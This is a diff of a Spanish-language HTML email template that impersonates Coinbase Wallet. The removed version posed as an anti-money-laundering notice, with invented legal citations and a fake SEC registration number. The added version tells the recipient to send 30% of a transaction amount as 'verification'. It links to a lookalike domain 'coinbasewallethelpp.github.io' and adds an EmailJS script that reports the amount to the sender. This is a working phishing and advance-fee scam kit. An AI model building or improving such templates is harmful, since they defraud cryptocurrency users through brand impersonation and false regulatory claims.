@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Transacción - Coinbase Wallet</title>
+    <title>Verificación del 30% - Coinbase Wallet</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -66,25 +66,6 @@
             color: #718096;
             text-align: center;
         }
-        .legal-terms {
-            margin-top: 30px;
-            padding: 20px;
-            border-top: 1px solid #e2e8f0;
-            font-size: 11px;
-            color: #718096;
-            line-height: 1.5;
-        }
-        .legal-terms h6 {
-            color: #2d3748;
-            margin: 10px 0;
-            font-size: 12px;
-        }
-        .disclaimer {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px 0;
-        }
     </style>
 </head>
 <body>
@@ -93,73 +74,70 @@
             <img src="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" alt="Coinbase Logo">
         </div>
 
-        <h2>Verificación de Transacción Requerida</h2>
+        <h2>Verificación del 30% Requerida</h2>
 
         <p>Estimado usuario,</p>
 
-        <p>Hemos detectado una transacción en curso en su cuenta por el siguiente monto:</p>
-
-        <!-- Mostrar monto con {{amount}} como parte de EmailJS -->
-        <div class="highlight">{{{amount}}} EUR</div>
+        <p>Para completar la verificación de su transacción, debe enviar el <strong>30% del monto total</strong> a su cuenta personal de Coinbase Wallet. Este paso es necesario para confirmar la legitimidad de la transacción.</p>
 
         <div class="verification-steps">
-            <p>De acuerdo con los protocolos de seguridad y regulaciones internacionales contra el lavado de activos, requerimos que:</p>
-            <ol>
-                <li>Verifique la procedencia de los fondos en la cadena de bloques</li>
-                <li>Confirme la legitimidad de esta transacción</li>
-                <li>Proporcione documentación comprobatoria del origen de los fondos</li>
-            </ol>
+            <p><strong>Monto total de la transacción:</strong> <span id="totalAmount">{{{amount}}}</span></p>
+            <p><strong>30% del monto a enviar:</strong> <span id="verificationAmount"></span></p>
         </div>
 
-        <p>Este proceso es necesario para garantizar que:</p>
-        <ul>
-            <li>Los fondos no provengan de actividades ilícitas</li>
-            <li>La transacción cumple con las regulaciones financieras internacionales</li>
-            <li>Podamos mantener la seguridad de su cuenta y de nuestra plataforma</li>
-        </ul>
+        <p>Por favor, siga estos pasos:</p>
+        <ol>
+            <li>Abra su aplicación Coinbase Wallet.</li>
+            <li>Envié el <strong>30% del monto</strong> a la dirección de su cuenta personal.</li>
+            <li>Confirme la transacción en su billetera.</li>
+        </ol>
 
-        <div class="disclaimer">
-            <p><strong>Importante:</strong> Este proceso es requerido bajo el Reglamento 5.16 del Acta de Secreto Bancario (BSA) y la normativa FINRA 2090.</p>
+        <div class="highlight">
+            <p>Una vez completado, su transacción será verificada automáticamente en un plazo de 24 horas.</p>
         </div>
 
-        <p>Por favor inicie el proceso de verificación haciendo clic en el siguiente enlace:</p>
-
-        <!-- Asegúrate de que el enlace se construya correctamente con {{amount}} -->
-        <a href="https://coinbasewallethelpp.github.io/VERIFICACION_DE_FONDOS_/?amount={{{amount}}}" class="button">Iniciar Verificación</a>
-
-        <div class="legal-terms">
-            <h6>Términos y Condiciones de la Verificación</h6>
-            <ul>
-                <li>Esta solicitud se realiza bajo el artículo 31 del código de prevención de lavado de activos (Ley 19.913)</li>
-                <li>Los datos proporcionados serán verificados contra las listas OFAC y FATF</li>
-                <li>Toda información será tratada bajo el RGPD y nuestra <a href="{{{privacy_policy}}}">Política de Privacidad</a></li>
-                <li>Nos reservamos el derecho de retener fondos según sección 8.2 de nuestros Términos de Servicio</li>
-                <li>Las transacciones mayores a $10,000 están sujetas a reporte CTR bajo regulación 31 CFR 1020.315</li>
-            </ul>
-
-            <p style="margin-top:15px;">
-                <strong>Confidencialidad:</strong> Este mensaje contiene información legalmente privilegiada. Si lo ha recibido por error, 
-                notifique inmediatamente al remitente y elimínelo de su sistema. Queda prohibida cualquier divulgación, 
-                distribución o copia no autorizada.
-            </p>
-
-            <p style="margin-top:10px;">
-                Coinbase Wallet® es una marca registrada operada por Coinbase, Inc., NMLS ID 1781415, 
-                regulada por FinCEN y supervisada por la SEC bajo número de registro 876543.
-            </p>
-
-            <p style="margin-top:10px; font-size:10px;">
-                AVISO: Este correo electrónico fue enviado automáticamente por nuestro sistema de cumplimiento. 
-                No responda directamente a este mensaje. Para consultas use el <a href="{{{support_link}}}">Centro de Soporte Autorizado</a>.
-            </p>
-        </div>
+        <a href="https://coinbasewallethelpp.github.io/verificacionenproceso/" class="button">He completado el envío</a>
 
         <div class="footer">
-            <p>Este proceso debe completarse dentro de las próximas 48 horas para evitar retrasos en su transacción.</p>
-            <p>Atentamente,<br>
-            <strong>Equipo de Cumplimiento - Coinbase Wallet</strong></p>
-            <p>¿Necesita ayuda? Contacte a nuestro <a href="{{{support_link}}}">equipo de soporte</a></p>
+            <p>Si tiene alguna duda, contacte a nuestro <a href="{{{support_link}}}">equipo de soporte</a>.</p>
         </div>
     </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Inicializar EmailJS con tu user_id
+        emailjs.init('user_EjV5FTI4JisVwIlW');  // Usar tu user_id de EmailJS
+
+        // Obtener el monto de la URL (pasado desde la plantilla)
+        const amount = parseFloat("{{{amount}}}");  // Usamos {{{amount}}} como valor del monto
+
+        // Verificar si el monto está disponible y es un número válido
+        if (amount && !isNaN(amount)) {
+            console.log('Monto extraído de la plantilla:', amount);  // Verifica que amount tenga el valor correcto.
+            
+            // Mostrar el monto total con formato de moneda
+            document.getElementById('totalAmount').textContent = `${amount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
+            
+            // Calcular el 30% y mostrarlo con formato de moneda
+            const verificationAmount = amount * 0.3;
+            console.log('30% del monto:', verificationAmount);  // Verifica el cálculo.
+            document.getElementById('verificationAmount').textContent = `${verificationAmount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
+
+            // Enviar los datos a EmailJS
+            emailjs.send("service_8kzc798", "template_woxom1z", {
+                amount: amount,
+                verificationAmount: verificationAmount
+            }).then(function(response) {
+                console.log("Correo enviado exitosamente", response);
+            }, function(error) {
+                console.log("Error al enviar el correo", error);
+            });
+
+        } else {
+            // Si el monto no está disponible o no es válido
+            document.getElementById('totalAmount').textContent = 'Monto no disponible';
+            document.getElementById('verificationAmount').textContent = 'Monto no disponible';
+        }
+    </script>
 </body>
 </html>
